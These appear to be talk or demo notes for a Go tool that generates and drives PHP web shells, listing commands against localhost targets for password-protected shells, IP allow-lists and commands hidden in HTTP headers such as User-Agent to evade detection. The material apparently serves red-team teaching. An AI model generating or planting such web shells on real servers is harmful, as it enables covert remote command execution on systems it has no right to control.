- talk about php shells with button
- show the client working with the form shell
  - http://localhost:8000/php-web-shell.php
  - `go run main.go http://127.0.0.1:8000/shell2.php --param cmd -X POST --trimp '<pre>' --trims '</pre>'`
- These shells are cool, but they're a pain to use, and can sometimes get caught if they're popular enough.
- show generate command
  - `go run main.go generate php --no-file > shells/nice.php`
    - `go run main.go http://127.0.0.1:8000/nice.php --param c`
  - `go run main.go generate php --pass Optiv123 --pass-param k > shells/nice.php`
    - `go run main.go http://127.0.0.1:8000/nice.php --param c -P k:Optiv123`
  - `go run main.go generate php -w 127.0.0.1 > shells/nice.php`
    - show how you can run commands from local pc, but not the winserver
  - `go run main.go generate php -w 127.0.0.1,10.0.0.12 > shells/nice.php`
    - show how now you can
  - commands over headers: `go run main.go generate php --header User-Agent > shells/nice.php`
    - `go run main.go http://127.0.0.1:8000/nice.php --header User-Agent`

TEST FILE FUNCTIONALITY
FIX ENC -> XOR
